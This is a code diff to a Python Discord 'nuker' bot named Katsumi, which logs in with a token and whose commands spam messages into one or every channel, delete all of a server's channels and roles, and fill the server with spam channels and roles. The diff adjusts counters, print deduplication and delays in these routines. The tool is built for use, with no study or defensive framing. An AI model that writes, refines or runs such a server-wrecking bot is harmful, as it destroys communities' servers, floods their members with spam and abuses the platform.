@@ -1,4 +1,3 @@
-
 import colorama, requests, random, asyncio, json, os, pyfiglet, discord, traceback
 from discord.ext import commands
 from colorama import Fore, Back, Style
@@ -23,6 +22,8 @@ count2 = 0 # removing channels
 count3 = 0 # creating roles
 count4 = 0 # removing roles
 count5 = 0 # server info and perms
+prCount = 0 
+lastPr = ""
 
 with open("icon.jpg", "rb") as f:
   icon = f.read()
@@ -190,13 +191,13 @@ async def loginToken(asyncloop, controllerID, token):
 	client.add_cog(Nuker(client, controllerID))
 	asyncloop.create_task(client.start(token))
 	return
-prCount = 0 
-lastPr = ""
+
 def safePrint(msg):
-	if prCount != 0:
-		return
+	global prCount, lastPr
 	if lastPr == msg:
 		return
+	lastPr = msg
+	prCount += 1
 	print(msg)
 
 class Nuker(commands.Cog):
@@ -223,12 +224,13 @@ class Nuker(commands.Cog):
 			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
 			return
 		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in #{ctx.channel.name}\n" + SRESET)
-		count0 = 0
+		#count0 = 0
 		for i in range(msgCount):
 			await ctx.send(getMessage)
 			count0 += 1
 			await asyncio.sleep(0.5)
-			if msgCount == count0:
+			if msgCount <= count0:
+				await asyncio.sleep(3)
 				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in #{ctx.channel.name}\n" + SRESET)
 				count0 = 0
 				break
@@ -246,14 +248,14 @@ class Nuker(commands.Cog):
 		for channel in ctx.guild.channels:
 			await channel.delete(reason=getMessage)
 			count2 += 1
-		count1 = 0
 		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is starting! | " + Style.DIM + f"Deleted every original channel and going to create {channelCount} Katsumi channels\n" + SRESET)
 		for i in range(channelCount):
 			txt = await ctx.guild.create_text_channel(getChannelName())
 			count1 += 1
 			await txt.send(getMessage)
 			#await asyncio.sleep(0.3)
-			if count1 == channelCount:
+			if count1 == channelCount:			
+				await asyncio.sleep(3)
 				safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Channel Nuke is done! | " + Style.DIM + f"Deleted {count2} original channel(s) and created {count1} Katsumi channels\n" + SRESET)
 				count1 = 0
 				count2 = 0
@@ -270,13 +272,13 @@ class Nuker(commands.Cog):
 			safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is already going on! | " + Style.DIM + f"Wait until the spam ends\n" + SRESET)
 			return
 		safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Global Spam is starting! | " + Style.DIM + f"Going to spam {msgCount} messages in every channel\n" + SRESET)
-		count0 = 0
 		for i in range(msgCount):
 			for txtchannel in ctx.guild.text_channels:
 			  await txtchannel.send(getMessage)
 			  #await asyncio.sleep(0.5)
 			count0 += 1
 			if msgCount == count0:
+			  await asyncio.sleep(3)
 			  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Spam is done! | " + Style.DIM + f"Spammed {count0} messages in every channel\n" + SRESET)
 			  count0 = 0
 			  break
@@ -297,12 +299,12 @@ class Nuker(commands.Cog):
 	      count4 += 1
 	    except Exception:
 	      continue
-	  count3 = 0
 	  safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is starting! | " + Style.DIM + f"Deleted every original role and going to create {roleCount} Katsumi roles\n" + SRESET)
 	  for i in range(roleCount):
 	    await ctx.guild.create_role(name=getRoleName(), color=getRandomColor())
 	    count3 += 1
 	    if count3 == roleCount:
+	      await asyncio.sleep(3)
 	      safePrint(Fore.GREEN + Style.BRIGHT + "\n[!] " + Style.NORMAL + "Role Nuke is done! | " + Style.DIM + f"Deleted {count4} original role(s) and created {count3} Katsumi role\n" + SRESET)
 	      count3 = 0
 	      count4 = 0
